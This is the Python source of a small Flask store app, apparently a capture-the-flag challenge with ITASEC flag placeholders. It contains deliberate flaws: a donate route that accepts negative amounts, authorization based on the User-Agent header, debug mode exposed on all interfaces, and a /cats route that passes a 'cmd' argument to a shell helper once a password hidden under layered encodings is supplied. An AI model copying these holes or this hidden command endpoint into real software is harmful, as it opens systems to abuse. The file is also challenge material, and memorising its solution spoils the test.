from flask import Flask, render_template, redirect, request, session, url_for
from flask_sqlalchemy import SQLAlchemy
import os, bcrypt, sqlalchemy
from sqlalchemy.sql import func
from config import static_articles
from flask_session import Session
import base64, subprocess, secrets, sys
from functools import wraps
import random

cat_food = "47 52 52 53 41 4e 4a 54 45 41 5a 54 41 49 42 58 47 51 51 44 4b 4e 4a 41 47 51 32 43 41 4e 4a 53 45 41 33 57 43 49 42 57 47 4d 51 44 47 4d 5a 41 47 59 5a 53 41 4e 5a 58 45 41 33 44 47 49 42 57 4d 51 51 44 4b 4d 4a 41 47 5a 52 43 41 4e 44 42 45 41 32 44 47 49 42 56 47 45 51 44 4d 59 52 41 47 52 51 53 41 4e 42 54 45 41 32 54 45 49 42 54 47 45 51 44 4d 4d 5a 41 47 51 33 53 41 4e 4a 57 45 41 33 54 53 49 42 56 47 55 51 44 47 4d 52 41 47 5a 52 53 41 4e 54 42 45 41 33 44 49 49 42 56 48 41 51 44 49 59 4a 41 47 59 34 43 41 4e 4a 52 45 41 32 44 4b 49 42 55 47 45 51 44 4d 59 4a 41 47 51 34 53 41 4e 5a 5a 45 41 32 47 49 49 42 57 48 41 51 44 4d 4d 52 41 47 55 33 53 41 4e 4a 57 45 41 33 44 51 49 42 57 47 51 51 44 4f 4f 4a 41 47 4d 59 43 41 4e 5a 55 45 41 32 47 47 49 42 56 47 45 51 44 47 5a 42 41 47 4e 53 41 3d 3d 3d 3d"

basedir = os.path.abspath(os.path.dirname(__file__))
dbpath = os.path.join(basedir, 'db')

app = Flask(__name__)

if not os.path.exists(dbpath):
    os.mkdir(dbpath)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(dbpath, 'database.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config["SECRET_KEY"] = os.getenv("SECRET", secrets.token_urlsafe(16))

db = SQLAlchemy(app)

app.config["SESSION_PERMANENT"] = True
app.config["SESSION_TYPE"] = "sqlalchemy"
app.config["SESSION_SQLALCHEMY"] = db

user_articles = db.Table('user_articles',
    db.Column('user_id', db.Integer, db.ForeignKey('user.id')),
    db.Column('article_id', db.Integer, db.ForeignKey('article.id'))
)

class Article(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(80), unique=True, nullable=False)
    description = db.Column(db.String(100), nullable=False, default="")
    price = db.Column(db.Float, nullable=False)
    img = db.Column(db.String(100), nullable=False, default="")
    secret_content = db.Column(db.String(300), nullable=False, default="")    

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    created_at = db.Column(db.DateTime(timezone=True), server_default=func.now())
    password = db.Column(db.String(72), nullable=False)
    wallet = db.Column(db.Float, nullable=False, default=23.00)
    articles = db.relationship('Article', secondary=user_articles, backref='users')
    
    def verify_password(self, password):
        if isinstance(password, str):
            password = password.encode()
        pwhash = bcrypt.hashpw(password, self.password)
        return self.password == pwhash

def hash_psw(password):
    if isinstance(password, str):
        password = password.encode()
    return bcrypt.hashpw(password, bcrypt.gensalt())

def authorize(mandatory=True):
    def authorize_inner(f):
        def on_failure(*args, **kws):
            if mandatory:
                return redirect(url_for('login'), code=302)
            else:
                return f(None, *args, **kws) 
        @wraps(f)
        def decorated_function(*args, **kws):
            if session.get("user", None) is None:
                return on_failure(*args, **kws)
            user = User.query.filter_by(username=session.get("user", None)).first()
            if user is None:
                session["user"] = None
                return on_failure(*args, **kws)
            return f(user, *args, **kws)            
        return decorated_function
    return authorize_inner

@app.route('/', methods=['GET'])
@authorize(mandatory=False)
def home(user:User):
    return render_template("home.html", user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not session.get("user", None) is None:
        return redirect("/store", code=302)
    if request.method == 'POST':
        if not "user" in request.form or not "psw" in request.form:
            return render_template("login.html", error="La richiesta non è valida")
        username = request.form["user"].strip().lower()
        if len(username) < 3 or len(request.form["psw"]) < 3:
            return render_template("login.html", error="La password e l'username devono essere almeno lunghi 3 caratteri")
        user = User.query.filter_by(username=username).first()
        if user is None:
            return render_template("login.html", error="L'username non è registrato!")
        if user.verify_password(request.form["psw"]):
            session["user"] = user.username
            session["failed_login"] = 0
            return redirect(url_for('store'), code=302)
        else:
            if "failed_login" in session:
                session["failed_login"] += 1
            else:
                session["failed_login"] = 1
            if session["failed_login"] > 1:
                session["failed_login"] = 0
                return redirect("https://www.youtube.com/watch?v=WXl9-Z9k4ac", code=302)
            return render_template("login.html", error="La password non è valida!")
    session["failed_login"] = 0
    return render_template("login.html", error=None)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if not session.get("user", None) is None:
        return redirect("/store", code=302)
    if request.method == 'POST':
        if not "user" in request.form or not "psw" in request.form:
            return render_template("register.html", error="La richiesta non è valida")
        username = request.form["user"].strip().lower()
        if len(username) < 3 or len(request.form["psw"]) < 3:
            return render_template("register.html", error="La password e l'username devono essere almeno lunghi 3 caratteri")
        user = User.query.filter_by(username=username).first()
        if not user is None:
            return render_template("register.html", error="Questo username è stato già utilizzato")
        user = User(
            username=username,
            password=hash_psw(request.form["psw"]),
        )
        try:
            db.session.add(user)
            session["user"] = user.username
            db.session.commit()
        except sqlalchemy.exc.IntegrityError:
            return render_template("register.html", error="Questo username è stato già utilizzato") 
        return redirect(url_for('store'), code=302)
    return render_template("register.html", error=None)

@app.route('/logout', methods=['GET'])
def logout():
    session["user"] = None
    return redirect(url_for('login'), code=302)

@app.route('/store', methods=['GET'])
@authorize()
def store(user:User):
    return render_template("store.html", user=user, articles=Article.query.all())

@app.route('/store/<int:article_id>/buy', methods=['GET', 'POST'])
@authorize()
def buy(user:User, article_id):
    article = Article.query.filter_by(id=article_id).first()
    if article is None:
        return redirect(url_for('store'), code=302)
    if request.method == 'POST':
        if article in user.articles:
            return render_template("article.html", user=user, article=article, error="Hai già acquistato questo articolo", success=False)
        if user.wallet < article.price:
            if "failed_buy" in session:
                session["failed_buy"] += 1
            else:
                session["failed_buy"] = 1
            if session["failed_buy"] > 1:
                session["failed_buy"] = 0
                return redirect(random.choice(["https://www.youtube.com/watch?v=nFZP8zQ5kzk", "https://www.youtube.com/watch?v=Bgqk6t9Be1Q"]), code=302)
            return render_template("article.html", user=user, article=article, error="Non hai abbastanza soldi", success=False)
        if "Samsung Smart Fridge" in article.description:
            if not "samsung smart fridge" in request.headers.get("User-Agent").lower():
                return render_template("article.html", user=user, article=article, error="Solo i Samsung Smart Fridge possono acquistare questo articolo", success=False)
        user.wallet -= article.price
        user.articles.append(article)
        db.session.merge(user)
        db.session.commit()
        session["failed_buy"] = 0
        return render_template("article.html", user=user, article=article, error=None, success=True)
    return render_template("article.html", user=user, article=article, error=None, success=None)

@app.route('/store/donate', methods=['GET','POST'])
@authorize()
def donate(user:User):
    if request.method == 'POST':
        if not "price" in request.form:
            return render_template("donate.html", user=user, error="La richiesta non è valida", success=False)
        if user.wallet < float(request.form["price"]):
            return render_template("donate.html", user=user, error="Non hai abbastanza soldi", success=False)
        user.wallet -= float(request.form["price"])
        db.session.merge(user)
        db.session.commit()
        return render_template("donate.html", user=user, error=None, success=True)
    return render_template("donate.html", user=user, error=None, success=None)

@app.route('/cats', methods=['GET'])
@authorize()
def cats(user:User):
    flag2 = False
    flag1 = False
    for article in user.articles:
        if flag2 and flag1: break
        if "Samsung Smart Fridge" in article.description:
            flag2 = True
        elif "1.000.000" in article.description:
            flag1 = True
    if flag1 and flag2 and request.args.get('psw') == base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ","")).decode()).decode()).decode()).decode():
        if request.args.get('cmd') is None:
            return ""
        else:
            try:
                return subprocess.run(['./shell', request.args.get('cmd')], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=0.5).stdout.decode()
            except Exception:
                return "0_0"
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ", code=302)

def main():
    app.run("0.0.0.0", 8080, debug=True)

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        Session(app)
        for article in static_articles:
            if Article.query.filter_by(title=article["title"]).first() is None:
                article = Article(**article)
                db.session.add(article)        
        db.session.commit()
    with open(os.path.join(basedir, f"flag.txt"), "wt") as f:
        f.write(os.getenv("FLAG3", "ITASEC{REDACTED3}"))
    if len(sys.argv) == 2 and sys.argv[1] == "docker":
        exit()
    os.chmod(os.path.join(basedir, "flag.txt"), 0o644)
    os.chmod(os.path.join(basedir, "db", "database.db"), 0o700)
    main()
